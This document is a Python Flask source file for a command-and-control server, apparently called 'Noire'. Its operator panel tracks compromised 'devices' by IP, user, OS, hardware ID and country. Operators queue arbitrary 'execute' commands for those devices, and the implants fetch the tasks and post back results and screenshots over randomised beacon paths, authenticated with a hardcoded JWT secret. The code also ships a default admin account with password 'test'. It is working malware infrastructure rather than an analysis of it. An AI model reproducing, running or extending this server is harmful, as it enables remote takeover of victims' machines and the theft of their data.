import flask
from flask_sqlalchemy import SQLAlchemy
import flask_login
import os
import secrets
import bcrypt
import base64
import jwt
from eventlet import wsgi, listen

app = flask.Flask(__name__)
app.secret_key = secrets.token_hex()
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite'

db = SQLAlchemy()

class User(db.Model):
    """A User in the database
    """
    __tablename__ = 'users'

    username = db.Column(db.String, primary_key=True)
    password = db.Column(db.String)
    authenticated = db.Column(db.Boolean, default=False)
    groups = db.Column(db.String, default='users')
    permissions = db.Column(db.String)

    def is_active(self):
        """True, as all users are active."""
        return True

    def get_id(self):
        return self.username

    def is_authenticated(self):
        """Return True if the user is authenticated."""
        return self.authenticated

    def is_anonymous(self):
        """False, as anonymous users aren't supported."""
        return False
    
class Group(db.Model):
    """A Group in the database
    """
    __tablename__ = "groups"
    
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String)
    permissions = db.Column(db.String)
    
class Device(db.Model):
    """A Device connected to the server
    """
    __tablename__= "devices"
    
    id = db.Column(db.Integer, primary_key=True)
    jwt = db.Column(db.String)
    ip = db.Column(db.String)
    user = db.Column(db.String)
    os = db.Column(db.String)
    domain = db.Column(db.String)
    country = db.Column(db.String)
    hwid = db.Column(db.String)
    notes = db.Column(db.String)
    initialConnection = db.Column(db.String)
    uniquePath = db.Column(db.String)
    taskPath = db.Column(db.String)
    responsePath = db.Column(db.String)

class Task(db.Model):
    """A task requested for a client to run
    """
    
    __tablename__ = "tasks"
    
    id = db.Column(db.String, primary_key=True)
    owner = db.Column(db.String)
    command = db.Column(db.String)
    arguments = db.Column(db.String)
    running = db.Column(db.Boolean, default=False)
    response = db.Column(db.String, default='NOTRUN')

db.init_app(app)
with app.app_context():
    db.create_all()

login_manager = flask_login.LoginManager()
login_manager.init_app(app)
login_manager.refresh_view = '/login'
login_manager.login_view = '/login'
    
@login_manager.user_loader
def user_loader(user_id):
    return User.query.get(user_id)

def valid_login(username:str, passw:str) -> bool:
    """Check if the given credentials are a valid account

    Args:
        username (str): The username to check
        passw (str): The password to check

    Returns:
        bool: If there is an account with the given credentials or not
    """
    if not username or not passw: return False
    user = User.query.get(username)
    print(user)
    if not user: return False
    try:
        passw = bytes(passw, 'utf-8')
        uPassword = bytes(user.password, 'utf-8')
        return bcrypt.checkpw(passw, uPassword)
    except:
        return False

def addAccount(username:str, passw:str, isAdmin:bool = False) -> str:
    """
+    Add a user to the database.
+
+    Args:
+        username (str): The username of the account to add.
+        passw (str): The password of the account to add.
+        isAdmin (bool, optional): Whether the account should have admin privileges.
+            Defaults to False.
+
+    Returns:
+        str: A message indicating whether the account was created successfully.
+    """
    if not username or not passw: return "All fields are required"
    user = User.query.get(username)
    if user: return "An account with this username already exists"
    passw = bytes(passw, 'utf-8')
    salt = bcrypt.gensalt(12)
    passw = str(bcrypt.hashpw(passw, salt))[2:-1]
    groups = ['users']
    if isAdmin: groups.append('admins')
    newUser = User(username=username, password=str(passw), groups=",".join(groups))
    db.session.add(newUser)
    db.session.commit()
    return 'Account created successfully'

#Startup checks
with app.app_context():
    a = addAccount('admin', 'test', True)
    a = None
    #Delete all known links for devices, so new can be generated
    if Device.query.all():
        for dev in Device.query.all():
            dev.uniquePath, dev.taskPath, dev.responsePath = '', '', ''

@app.errorhandler(404)
def not_found(error):
    return flask.render_template('404.html'), 404

@app.route('/')
def indexPage():
    return flask.redirect(flask.url_for('loginPage'))

#Load icon and CSS stylesheet
@app.route('/favicon.ico')
def favicon():
    return flask.send_from_directory(os.path.join(app.root_path, 'static'),
                               'favicon.ico', mimetype='image/vnd.microsoft.icon')

@app.route('/style.css')
def stylesheel():
    return flask.send_from_directory(os.path.join(app.root_path, 'static'), 'style.css')

@app.route('/login', methods=['POST', 'GET'])
def loginPage():
    """
    This function is the handler for the '/login' endpoint, which is accessed via both POST and GET methods.
    It renders the 'logIn.html' template and passes the 'error' variable to it.

    Args:
        None

    Returns:
        If the request method is POST and the login credentials are valid, it redirects to the 'overviewPage'.
        If the user is remembered (i.e., logged in previously), it redirects to the 'overviewPage'.
        Otherwise, it renders the 'logIn.html' template with the 'error' variable.
    """
    error = None
    if flask.request.method == 'POST':
        if valid_login(flask.request.form['username'],
                       flask.request.form['password']):
            user = User.query.get(flask.request.form['username'])
            user.authenticated = True
            db.session.commit()
            flask_login.login_user(user, remember=True)
            next = flask.request.args.get('next')
            '''if not url_has_allowed_host_and_scheme(next, flask.request.host):
                return flask.abort(400)'''
            return flask.redirect(next or flask.url_for('overviewPage'))
        else:
            error = 'Invalid username/password'
    if flask_login.login_remembered():
        return flask.redirect(flask.url_for('overviewPage'))
    try:
        user = flask.request.form['username']
    except KeyError:
        user = ""
    return flask.render_template('logIn.html', error = error)

@app.route('/logout')
@flask_login.login_required
def logoutPage():
    """
    Logs out the current user by setting authenticated to False, committing the change to the database, and logging out the user. 
    Returns the rendered 'logOut.html' template.
    """
    user = User.query.get(flask_login.current_user.username)
    user.authenticated = False#might not need ths due to flask_login.logout_user
    db.session.commit()
    flask_login.logout_user()
    return flask.render_template('logOut.html')#might just want to redirect to login page


@app.route('/overview')
@flask_login.login_required
def overviewPage():
    devAmount = 0
    if Device.query.all():
        devAmount = len(Device.query.all())
    return flask.render_template('overview.html', user = flask_login.current_user.username, devices = devAmount)

@app.route('/clients', methods=['GET', 'POST'])
@flask_login.login_required
def clientsPage():
    if flask.request.method == 'GET':
        return flask.render_template('clients.html', clients = Device.query.all())
    else:
        if Device.query.filter_by(jwt=flask.request.form['jwt']).all():
            print('found')
            if flask.request.form['action'] == 'execute':
                task = Task(id=generateRandPath(), owner=flask.request.form['jwt'],
                            command='execute', arguments=flask.request.form['arguments'])
                db.session.add(task)
                db.session.commit()
            flask.flash('Command executed')#doesnt show because redirect, show on load template?
            return flask.render_template('clients.html', clients = Device.query.all())
        return flask.render_template('clients.html', clients = Device.query.all())

#C2 interface
def validateC2Client(request:flask.request) -> bool:
    """
    This function validates the C2 client by checking the request headers and decoding the NClient-Token. 
    It returns a boolean value indicating whether the client is valid or not.
    """
    try:
        if request.headers['User-Agent'].split()[0] != 'NClient': return False
        cToken = request.headers['NClient-Token']
        cToken = jwt.decode(cToken, 'Noire', algorithms=['HS256'])
        #if cToken['ip'] != request.remote_addr: return False #Blocks Proxies, VPN's and LAN devices
        cToken['os']
        cToken['user']
        cToken['hwid']
        cToken['time']
        cToken['country']
        cToken['domain']
        #add check for payload, validate encryption etc
        #Add check if NClient-Token (jwt) IP is same as request IP
        return True
    except KeyError or jwt.DecodeError:
        return False

def generateRandPath() -> str:
    """
    A function that generates a random path of length 12 consisting of alphanumeric characters.
    Returns: str
    """
    x = ""
    for y in range(12):
        x += secrets.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
    return x

@app.route('/contact')
def contactC2Page():
    """
    A route for the contact page. Validates the C2 client, decodes the JWT, generates random paths, 
    and adds a new client to the database if it doesn't exist. Otherwise, retrieves the paths from 
    the existing client. Finally, it returns a response with the paths in the headers.
    """
    if not validateC2Client(flask.request): return not_found('Invalid')
    jwT = flask.request.headers['NClient-Token']
    if not Device.query.filter_by(jwt=jwT).all():
        token = jwt.decode(jwT, 'Noire', algorithms=["HS256"])
        uP, tP, rP = generateRandPath(), generateRandPath(), generateRandPath()
        newClient = Device(jwt=jwT, ip=token['ip'], os=token['os'], user=token['user'],
                           hwid=token['hwid'], uniquePath=uP, taskPath=tP, responsePath=rP,
                           initialConnection=token['time'], country=token['country'], domain=token['domain'])
        db.session.add(newClient)
        db.session.commit()
    else:
        a = Device.query.filter_by(jwt=jwT).all()[0]
        uP, tP, rP = a.uniquePath, a.taskPath, a.responsePath
    resp = flask.make_response("")
    resp.headers['NClient-Path'], resp.headers['NClient-TaskPath'], resp.headers['NClient-ResponsePath'] = uP, tP, rP
    return resp
    

@app.route('/c/<c2ID>/<pName>', methods=["GET", "POST"])
def instructReponsePages(c2ID:str, pName:str):
    """
    This function handles the response from a C2 client.

    Args:
        c2ID (str): The unique ID of the C2 client.
        pName (str): The name of the page (task or response).

    Returns:
        str or flask.Redirect: The response to be sent back to the C2 client.
    """
    if not validateC2Client(flask.request): return not_found("Invalid")
    jwT = flask.request.headers['NClient-Token']
    try:
        gjwT = Device.query.filter_by(jwt=jwT).all()[0]
    except KeyError:
        return not_found("Skipped initialisation")#if not in the system, something is fishy
    if c2ID != gjwT.uniquePath: return not_found("Bad unique path")
    if pName != gjwT.taskPath and pName != gjwT.responsePath: return not_found("Bad type path")
    if pName == gjwT.taskPath:
        if flask.request.method != "GET": return not_found("Bad method on control path")
        tasks = Task.query.filter_by(owner=jwT, running=False, response='NOTRUN')
        if not tasks: return not_found("No tasks")
        tR = []
        for task in tasks:
            tR.append(jwt.encode({'id': task.id, 'command': task.command, 'args': task.arguments}, 'Noire'))#allow this to be modified
            task.running = True
        db.session.commit()
        return '\n'.join(tR)
    else:
        if flask.request.method != "POST": return not_found("Bad method on control path")
        try:
            task = flask.request.headers['NClient-TaskResponse']
        except KeyError:
            return not_found("No finished task")#flag this in logs
        task = base64.b64decode(task).split(b'*')
        taskID = task[0].decode(); taskResponse = task[1]
        setTask = Task.query.filter_by(owner=jwT, id=taskID).all()
        if not setTask: return not_found('No task with ID')#flag this in logs
        setTask = setTask[0]
        setTask.running = False
        if setTask.command == 'screenshot':
            setTask.response = taskResponse
        setTask.response = base64.b64encode(taskResponse)
        db.session.commit()
        tasks = Task.query.filter_by(owner=jwT, running=False, response='NOTRUN').all()
        if not tasks: return ""
        else: return flask.redirect(f'/c/{gjwT.uniquePath}/{gjwT.taskPath}')

#Run forever
def start_server(port:int):
    """
    Start a server on the specified port.

    Args:
        port (int): The port number on which the server will listen.

    Returns:
        None
    """
    server = wsgi.Server(listen(('0.0.0.0', port)), '127.0.0.1', app=app)
    print(f"Web server running on http://127.0.0.1:{str(port)}/")
    print(server.address)
    server.serve_forever()